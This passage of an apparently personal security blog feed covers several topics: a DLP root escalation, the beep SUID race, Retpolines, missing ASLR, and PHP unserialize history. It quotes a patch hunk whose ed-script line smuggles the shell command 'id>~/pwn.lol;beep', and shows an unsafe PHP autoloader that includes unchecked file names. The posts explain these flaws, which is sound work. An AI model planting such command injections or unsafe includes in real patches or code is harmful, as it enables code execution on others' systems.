&lt;p&gt;We deployed Websense DLP across all company Macs, and anybody renaming their &lt;code&gt;vim&lt;/code&gt; to &lt;code&gt;kvoop&lt;/code&gt; can edit the files, which are then loaded into a privileged process and run as root.&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Websense DLP is an instant root on all Mac machines where it is being deployed.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;Addendum:&lt;/em&gt; Security picked up on this, and communicated the problem to the vendor, which then shipped a fix. It is unknown to me if they also fixed their broken security processes. We ceased using the product shortly after that.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>beep, patch and ed</title>
      <link>https://blog.koehntopp.info/2018/04/06/beep-patch-and-ed.html</link>
      <pubDate>Fri, 06 Apr 2018 00:00:00 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2018/04/06/beep-patch-and-ed.html</guid>
      <description>&lt;p&gt;So a few days ago, somebody found an exploit in beep - now
&lt;a href=&#34;https://nvd.nist.gov/vuln/detail/CVE-2018-0492&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2018-0492&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;beep is a program that is part of Debian (and Ubuntu) to have the PC speaker
multiple times, at different frequencies, with different pauses and beep
lengths. That works just fine. It&amp;rsquo;s also SUID root. There is zero code in it
that deals with the fact that it may run privileged.&lt;/p&gt;
&lt;p&gt;The author confidently writes:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Some users will encounter a situation where beep dies with a complaint
from ioctl(). The reason for this, as Peter Tirsek was nice enough to
point out to me, stems from how the kernel handles beep&amp;rsquo;s attempt to poke
at (for non-programmers: ioctl is a sort of catch-all function that lets
you poke at things that have no other predefined poking-at mechanism) the
tty, which is how it beeps. The short story is, the kernel checks that
either:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;you are the superuser&lt;/li&gt;
&lt;li&gt;you own the current tty&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;What this means is that root can always make beep work (to the best of my
knowledge!), and that any local user can make beep work, BUT a non-root
remote user cannot use beep in it&amp;rsquo;s natural state.&lt;/p&gt;
&lt;p&gt;What&amp;rsquo;s worse, an xterm, or other x-session counts, as far as the kernel is
concerned, as &amp;lsquo;remote&amp;rsquo;, so beep won&amp;rsquo;t work from a non-privileged xterm
either. I had originally chalked this up to a bug, but there&amp;rsquo;s actually
nothing I can do about it, and it really is a Good Thing that the kernel
does things this way.&lt;/p&gt;
&lt;p&gt;There is also a solution. By default beep is not installed with the suid
bit set, because that would just be zany. On the other hand, if you do
make it suid root, all your problems with beep bailing on ioctl calls will
magically vanish, which is pleasant, and the only reason not to is that
any suid program is a potential security hole.&lt;/p&gt;
&lt;p&gt;Conveniently, beep is very short, so auditing it is pretty
straightforward. Decide for yourself, of course, but it looks safe to me -
there&amp;rsquo;s only one buffer and fgets doesn&amp;rsquo;t let it overflow, there&amp;rsquo;s only
one file opening, and while there is a potential race condition there,
it&amp;rsquo;s with /dev/console. If someone can exploit this race by replacing
/dev/console, you&amp;rsquo;ve got bigger problems. :)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So here is how you race this: &lt;a href=&#34;https://gist.github.com/fkt/5f8f9560ef54e11ff7df8bec09dc8f9a&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;beepbop&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;Which is bad, because Ubuntu and Debian both install beep SUID root, by
default. You can check with &amp;ldquo;dpkg-reconfigure -plow beep&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2018/04/dpkg-reconfigure-beep.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;Debian installs beep SUID root by default, &amp;ldquo;dpkg-reconfigure -plow
beep&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Somebody also created a fun website for the beep problem, complete with
logo and name: &lt;a href=&#34;https://holeybeep.ninja/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Holey Beep&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2018/04/holey-beep.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://holeybeep.ninja/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Holey Beep&lt;/a&gt;

: The site, which is done very tongue
in cheek, also contained a &lt;a href=&#34;https://holeybeep.ninja/beep.patch&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;patch&lt;/a&gt;

 for
the problem, advertising it like this:&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2018/04/patch-exploit.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;So why would your computer beep when it applies a patch?
That&amp;rsquo;s another fun thing. The patch contains this hunk:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;--- /dev/null	2018-13-37 13:37:37.000000000 +0100
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+++ b/beep.c	2018-13-37 13:38:38.000000000 +0100
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;1337a
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1,112d
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gs&#34;&gt;!id&amp;gt;~/pwn.lol;beep # 13-21 12:53:21.000000000 +0100
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;gs&#34;&gt;&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and that looks very much like an ed-script. In fact, until recently that is
exactly what patch did: popen a copy of ed and feed it. The line &amp;ldquo;id &amp;gt;
~/pwn.lol; beep&amp;rdquo; will hence be run, create a file pwn.lol in $HOME with the
current user id, and then execute beep. That&amp;rsquo;s the promised beep you hear.&lt;/p&gt;
&lt;p&gt;Of course code execution by a thing you expect to handle data is a problem,
and that is now
&lt;a href=&#34;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000156&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CVE-2018-1000156&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;It&amp;rsquo;s fixed by writing the ed code to a tmp file while filtering the commands
fed to ed, and then feeding the filtered input into ed.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Spectre #2 Mitigation - Retpolines</title>
      <link>https://blog.koehntopp.info/2018/02/26/spectre-2-mitigation-retpolines.html</link>
      <pubDate>Mon, 26 Feb 2018 15:02:37 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2018/02/26/spectre-2-mitigation-retpolines.html</guid>
      <description>&lt;p&gt;Intel finally published a whitepaper about Spectre #2 Mitigation. The
&lt;a href=&#34;https://software.intel.com/sites/default/files/managed/1d/46/Retpoline-A-Branch-Target-Injection-Mitigation.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PDF&lt;/a&gt;


is also featured on
&lt;a href=&#34;https://news.ycombinator.com/item?id=16423401&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Hacker News&lt;/a&gt;

. It&amp;rsquo;s a technical
whitepaper, but you can see the footprints of lawyers all over the
language. For me, it basically says that, yes, Retpolines are indeed
incompatible with Controlflow Enforcement Technology (CET) that Intel
was planning for later CPUs
(&lt;a href=&#34;https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PDF&lt;/a&gt;

,
&lt;a href=&#34;https://www.theregister.co.uk/2016/06/10/intel_control_flow_enforcement/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;El Reg article&lt;/a&gt;

).&lt;/p&gt;
&lt;p&gt;CET introduces a shadow stack for return addresses only, and will fail
your code into an exception if the normal stack return address and the
shadow stack address disagree. Trying to touch and manipulate the
shadow stack will also fail into an exception. That is, CET makes
touching a return address on the stack toxic by having in effect
separate argument and return address stacks, and your code explodes
every time you try to do something funny with return addresses. Which
is what Retpolines depend on.&lt;/p&gt;
&lt;p&gt;Intel also note that
Retpolines also require Return Stack Stuffing in order to work
properly, because otherwise RET will also speculate and the Retpoline
will not work as intended. They also note that external events can
interact with the Return Stack Buffer (RSB) and empty it and they
don&amp;rsquo;t actually write but strongly imply that these external events are
not a thing you have control over, as these are&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There are also a number of events that happen asynchronously from normal
program execution that can result in an empty RSB. Software may use “RSB
stuffing” sequences whenever these asynchronous events occur:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Interrupts/NMIs/traps/aborts/exceptions which increase call depth.&lt;/li&gt;
&lt;li&gt;System Management Interrupts (SMI) (see BIOS/Firmware Interactions).&lt;/li&gt;
&lt;li&gt;Host VMEXIT/VMRESUME/VMENTER.&lt;/li&gt;
&lt;li&gt;Microcode update load (WRMSR 0x79) on another logical processor of the same core.&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;The hardware you run on can either have a Spectre vulnerability and require
Retpolines, or have CET and Hardware Spectre Mitigation, but not both. So
you generate code for either one or the other, and they suggest
instrumentation of the loader to patch all indirect jump callsites as
required.&lt;/p&gt;
&lt;p&gt;That&amp;rsquo;s not completely insane, as loaders already patch up jump instructions
at load time.&lt;/p&gt;
&lt;p&gt;They do note that virtual machines in clustered setups with life migration
may be at a disadvantage here, as this is a load-time thing and hence you
need to expose your worst CPU in a cluster as the virtual CPU to your VMs in
order for this to work with migration. That&amp;rsquo;s already a requirement in
heterogenous clusters, but still annoying.&lt;/p&gt;
&lt;p&gt;All in all, this is basically disappointing to underwhelming.&lt;/p&gt;
&lt;p&gt;The TL;DR is that Retpolines and CET are indeed incompatible, and ld.so is
called to the rescue to patch up code at load time for one or the other. The
ld.so thing is an interesting observation. It means that the code on disk
and the code in memory differ in one more way.&lt;/p&gt;
&lt;p&gt;As these things accumulate, the actual on-disk machine instructions mutate
over time into a kind of virtual machine notation that on load is adjusted
more and more to the needs of the actual machine it&amp;rsquo;s being executed on.
Maybe a thing such as a JVM and a JIT is not the worst thing that has
happened to us.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>ASLR</title>
      <link>https://blog.koehntopp.info/2017/10/20/aslr.html</link>
      <pubDate>Fri, 20 Oct 2017 16:08:14 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2017/10/20/aslr.html</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#define MH_PIE 0x200000 &lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/* When this bit is set, the OS will load the main executable at a random address. Only used in MH_EXECUTE filetypes. */&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If that flag is on, MacOS will enable
&lt;a href=&#34;https://de.wikipedia.org/wiki/Address_Space_Layout_Randomization&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;ASLR&lt;/a&gt;

 and
the binary will have different load addresses for code, data, heap and stack
every time it is running.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;err&#34;&gt;$&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sudo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;otool&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;h&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Library&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Application&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Support&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TrendMicro&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;TmccMac&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;iCoreService_tmsm&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Mach&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;header&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;     &lt;span class=&#34;n&#34;&gt;magic&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cputype&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;cpusubtype&lt;/span&gt;  &lt;span class=&#34;n&#34;&gt;caps&lt;/span&gt;    &lt;span class=&#34;n&#34;&gt;filetype&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ncmds&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;sizeofcmds&lt;/span&gt;      &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;mh&#34;&gt;0xfeedfacf&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;16777223&lt;/span&gt;          &lt;span class=&#34;mi&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x80&lt;/span&gt;            &lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;    &lt;span class=&#34;mi&#34;&gt;20&lt;/span&gt;        &lt;span class=&#34;mi&#34;&gt;2656&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;0x00018085&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Check the &amp;lsquo;flags&amp;rsquo; for this. No 0x200000, no ASLR. Not here, and not on any
other binary with &amp;ldquo;TrendMicro&amp;rdquo; in the pathname. And that is why you can&amp;rsquo;t
have nice things.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>The inherent Asymmetry of online attacks</title>
      <link>https://blog.koehntopp.info/2017/10/12/the-inherent-asymmetry-of-online-attacks.html</link>
      <pubDate>Thu, 12 Oct 2017 22:40:26 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2017/10/12/the-inherent-asymmetry-of-online-attacks.html</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://twitter.com/k8em0/status/918516496569073664&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Katie Moussouris explains teh Cyber&lt;/a&gt;


and how it is asymmetric:&lt;/p&gt;
&lt;p&gt;»&amp;quot;#Cassandra moment: Explaining that determining &amp;ldquo;cyber norms&amp;rdquo; in today&amp;rsquo;s
world order misses emerging capabilities &amp;amp; motivations of new actors.&lt;/p&gt;
&lt;p&gt;Forget &amp;ldquo;attribution&amp;rdquo;. Not what I mean.&lt;/p&gt;
&lt;p&gt;Deterrence, state responsibility, etc in existing state context assumes most
want to keep stability. Plenty of non-terrorist smaller states &amp;amp;
non-state-non-criminal actors have or can acquire capabilities &amp;amp; would not
be sanctionable, for example when we think through deterrence strategies,
consider not just world order we have that prefers stability, but those who
prefer destability.&lt;/p&gt;
&lt;p&gt;We&amp;rsquo;re erroneously trying to defend against a magnetic power reversal of the
N &amp;amp; S poles, but the cyberwar powers are everywhere &amp;amp; unaligned.&lt;/p&gt;
&lt;p&gt;We miss the point if we think the answer is to contain those weapons/tools.&lt;/p&gt;
&lt;p&gt;We hurt defense when we limit their distribution for analysis.&amp;quot;«&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>A (sad) security user story</title>
      <link>https://blog.koehntopp.info/2017/10/10/a-sad-security-user-story.html</link>
      <pubDate>Tue, 10 Oct 2017 17:05:31 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2017/10/10/a-sad-security-user-story.html</guid>
      <description>&lt;p&gt;Here is a &lt;a href=&#34;https://www.mountaingoatsoftware.com/agile/user-stories&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;user story&lt;/a&gt;

 for
implementors of security systems and platform hardening initiatives:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;As &lt;strong&gt;any user&lt;/strong&gt; , I never want to get a &amp;ldquo;denied&amp;rdquo; message, but a &amp;quot; &lt;strong&gt;in
order to do what you want you are missing the &lt;em&gt;X&lt;/em&gt; permission&lt;/strong&gt;&amp;quot; message in
order to be able to track down the root cause and request the appropriate
permissions more easily.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It&amp;rsquo;s not that hard, really.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GitLab: You are not allowed to push code to this project.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Well, it&amp;rsquo;s harder for some, apparently. That&amp;rsquo;s one hour of my life I am not
getting back.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Why I can&#39;t transfer money with my Monitor upright</title>
      <link>https://blog.koehntopp.info/2017/08/28/why-i-cant-transfer-money-with-my-monitor-upright.html</link>
      <pubDate>Mon, 28 Aug 2017 10:18:07 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2017/08/28/why-i-cant-transfer-money-with-my-monitor-upright.html</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://www.berliner-sparkasse.de/de/home/service/faq.html?n=true&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2017/08/berliner-sparkasse.jpg&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.berliner-sparkasse.de/de/home/service/faq.html?n=true&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Berliner Sparkasse Onlinebanking FAQ&lt;/a&gt;

:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Why do I get the message &amp;lsquo;mobile device, can&amp;rsquo;t perform smsTAN money
transfer&amp;rsquo; when using my Desktop computer.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;A possible cause is the display resolution. Your computer is being
detected as a mobile device by our online banking system. smsTAN is not
working from a mobile device.&lt;/p&gt;
&lt;p&gt;Solution: Change the display resolution&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So 1920x1080 does work, but 1080x1920 doesn&amp;rsquo;t.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PHP: Understanding unserialize()</title>
      <link>https://blog.koehntopp.info/2017/08/11/php-understanding-unserialize.html</link>
      <pubDate>Fri, 11 Aug 2017 13:50:20 +0000</pubDate>
      
      <guid>https://blog.koehntopp.info/2017/08/11/php-understanding-unserialize.html</guid>
      <description>&lt;p&gt;The history of &lt;code&gt;serialize()&lt;/code&gt; and &lt;code&gt;unserialize()&lt;/code&gt; in PHP begins with Boris
Erdmann and me, and we have to go 20 years back in time. This is the day of
the prerelease versions of PHP 3,
&lt;a href=&#34;http://marc.info/?l=php-general&amp;amp;amp;m=90222513233060&amp;amp;amp;w=2&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;some time in 1998&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;Boris and I were working on code for a management system for employee education
for German Telekom. The front side is a web shop that sells classes and
courses, the back end is a complex structure that manages attendance, keeps
track of a line manager approval hierarchy and provides alternative dates
for overfull classes. In order to manage authentication, shopping carts and
other internal state, we needed something that allowed us to go from a
stateless system to a stateful thing, securely. The result was
&lt;a href=&#34;https://github.com/bevhost/phplib&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;PHPLIB&lt;/a&gt;

, and especially the code in
&lt;a href=&#34;https://github.com/bevhost/phplib/blob/master/inc/session.inc#L272-L318&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;session.inc&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;That code contained a function &lt;code&gt;serialize()&lt;/code&gt;, which created a stringified
representation of a PHP variable and appended it to a string. There was no
&lt;code&gt;unserialize()&lt;/code&gt; necessary, because &lt;code&gt;serialize()&lt;/code&gt; generated PHP code.
&lt;code&gt;eval()&lt;/code&gt; would &lt;code&gt;unserialize()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;One of the problems&lt;/strong&gt; we had to solve was that PHP3 was slow. So if we
were to write out a serialized representation of variables, we would have to
write a parser for that, and that parser better be fast, because it would be
executed at the beginning of each and every page load. We already had such a
parser, and it was the fastest parser available, PHP itself. So we decided
to write a function that takes a variable, recurses through that variable
and generated PHP code to recreate the variable if that code would be
executed.&lt;/p&gt;
&lt;p&gt;For scalars,
&lt;a href=&#34;https://github.com/bevhost/phplib/blob/master/inc/session.inc#L313&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;that is trivial&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;For an array,
&lt;a href=&#34;https://github.com/bevhost/phplib/blob/master/inc/session.inc#L313&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;that is possible with a simple recursion over each element&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;For objects, things are complicated.&lt;/p&gt;
&lt;p&gt;Firstly, in PHP3, an object does not have the slightest clue what it&amp;rsquo;s
classname is. Secondly, an object might have instance variables that we do
not want to be part of the stringified representation of the object, for
example file and image file handles or other resources. We solved both
problems by requiring serializable objects to have metadata instance
variables, &lt;code&gt;classname&lt;/code&gt; and &lt;code&gt;persistent_slots&lt;/code&gt;&amp;quot;.&lt;/p&gt;
&lt;p&gt;For unserialize, we simply executed that code inside an &lt;code&gt;eval()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;From PHP 4 onward, Sascha Schumann wrote a C implementation of session
management that became a standard part of PHP, which was largely based on
our ideas. Unlike us, he made PHP store session data in the filesystem,
inheriting our idea of probabilistic session expiration. He also converted
the data format from PHP Code to the current representation.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Another problem that needed adressing was code uniformity:&lt;/strong&gt;
If you load a serialized object written by another web page of your
application, that object has a class. And the code for that class needs to
be loaded before you can load and re-instantiate that object. Basically, you
saved an instance &lt;code&gt;$a&lt;/code&gt; of &lt;code&gt;DemoClass&lt;/code&gt;, and if you load that instance again,
running &lt;code&gt;unserialize()&lt;/code&gt; on it, PHP needs to know what a &lt;code&gt;DemoClass&lt;/code&gt; is and
how to make one, using &lt;code&gt;$a = new DemoClass()&lt;/code&gt;, before it can fill in the
values of all instance variables. So the includes of your app better be the
same on all pages, or you invent the
&lt;a href=&#34;http://php.net/manual/en/function.autoload.php&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;Autoloader&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;The Autoloader originally was a simple callback function that would be
invoked every time you want to make an instance of an unknown class. The
function would get the name of the missing class as a parameter, and would
then be responsible to produce a class definition for that class.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;__autoload&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$missing&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Class &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$missing&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt; is missing.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$missing&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;.class.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;DoesNotExist&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is your classic suicide autoloader: Whenever an undefined class is
being encountered, &lt;code&gt;__autoload()&lt;/code&gt; is being called with that classname. It
would then try to include a file with that name (and all dots and slashes
that you manage to falsify into that name) and hope that this would contain
code that defined a class with a matching name.&lt;/p&gt;
&lt;p&gt;Real autoloaders should not look like this (but often they are close enough
to this code to contain exploitable security problems).&lt;/p&gt;
&lt;p&gt;Today the autoload mechanism of PHP is more complicated. It has a
&lt;a href=&#34;http://php.net/manual/en/function.spl-autoload.php&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;default autoloader&lt;/a&gt;

,
&lt;a href=&#34;http://php.net/manual/en/function.spl-autoload-register.php&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;a mechanism to manage a stack of autoloaders&lt;/a&gt;

,
and a bunch of &lt;a href=&#34;http://php.net/manual/en/function.spl-autoload-extensions.php&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;other&lt;/a&gt;


&lt;a href=&#34;http://php.net/manual/en/function.include.php&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;things&lt;/a&gt;

 such as file
extensions and include path names to influence all that. It is also quite
good,
&lt;a href=&#34;https://github.com/Sereal/Sereal/blob/master/README.pod&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;even if more sophisticated serializers exist&lt;/a&gt;

.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;So what is the state of &lt;code&gt;unserialize()&lt;/code&gt; in PHP these days, and why?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;p class=&#34;md__image&#34;&gt;
  &lt;img src=&#34;https://blog.koehntopp.info/uploads/2017/08/Screen-Shot-2017-08-11-at-13.44.00.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;

&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://twitter.com/nikita_ppv/status/895571304325062656&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;That was a controversial Tweet&lt;/a&gt;

&lt;/p&gt;
&lt;p&gt;It links to this:&lt;/p&gt;
